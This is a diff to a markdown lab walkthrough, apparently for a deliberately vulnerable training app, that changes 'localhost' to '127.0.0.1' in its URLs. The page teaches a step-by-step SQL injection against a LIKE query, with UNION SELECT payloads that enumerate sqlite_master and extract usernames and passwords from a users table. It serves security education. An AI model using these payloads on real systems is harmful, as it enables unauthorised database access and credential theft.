@@ -44,7 +44,7 @@ The first step is to identify parameters which could be potentially used in an S
 ![](.gitbook/assets/sqli-like-1.png)
 
 ```text
-http://localhost:5000/home/Admin
+http://127.0.0.1:5000/home/Admin
 ```
 
 ### Step2
@@ -54,7 +54,7 @@ Now let's see if we can create an error by injecting a single quote
 ![](.gitbook/assets/sqli-like-2.png)
 
 ```text
-http://localhost:5000/home/Admin'
+http://127.0.0.1:5000/home/Admin'
 ```
 
 By doing so the SQL query syntax is now faulty. This is due to the fact that the user supplied input is being directly concatenated into the SQL query.
@@ -70,7 +70,7 @@ Now we need to inject characters to make the SQL query syntactically correct.
 ![](.gitbook/assets/sqli-like-3.png)
 
 ```text
-http://localhost:5000/home/Admin%'--
+http://127.0.0.1:5000/home/Admin%'--
 ```
 
 After that we inject a logical operator which is true \(and 1=1\). This should result in the application run as intended without errors.
@@ -92,7 +92,7 @@ The UNION operator is used in SQL injections to join a query, purposely forged t
 ![](.gitbook/assets/sqli-like-5.png)
 
 ```text
-http://localhost:5000/home/Admin%' union select 1--
+http://127.0.0.1:5000/home/Admin%' union select 1--
 ```
 
 This query results in an error, this is due to the fact that the original query started with 2 columns namely  
@@ -101,7 +101,7 @@ This query results in an error, this is due to the fact that the original query 
 ![](.gitbook/assets/sqli-like-6.png)
 
 ```text
-http://localhost:5000/home/Admin%' union select 1,2--
+http://127.0.0.1:5000/home/Admin%' union select 1,2--
 ```
 
 Notice how "UserName" and "email" became placeholders for data we want to retrieve from the database
@@ -113,7 +113,7 @@ Now that we determined the number of columns we need to take, the next step is q
 ![](.gitbook/assets/sqli-like-7.png)
 
 ```text
-http://localhost:5000/home/Admin%' union select 1,2 from sqlite_master--
+http://127.0.0.1:5000/home/Admin%' union select 1,2 from sqlite_master--
 ```
 
 #### Step 3
@@ -123,7 +123,7 @@ Now we need to discover the table and columns name of the table we want to extra
 ![](.gitbook/assets/sqli-like-8.png)
 
 ```text
-http://localhost:5000/home/Admin%' union select tbl_name,sql from sqlite_master limit 1,1--
+http://127.0.0.1:5000/home/Admin%' union select tbl_name,sql from sqlite_master limit 1,1--
 ```
 
 #### Step 4
@@ -133,7 +133,7 @@ Now we have all the information required to extract data from _users_ table. Pla
 ![](.gitbook/assets/sqli-like-9.png)
 
 ```text
-http://localhost:5000/home/Admin%' union select UserName,Password from users limit 0,1--
+http://127.0.0.1:5000/home/Admin%' union select UserName,Password from users limit 0,1--
 ```
 
 ## Additional sources
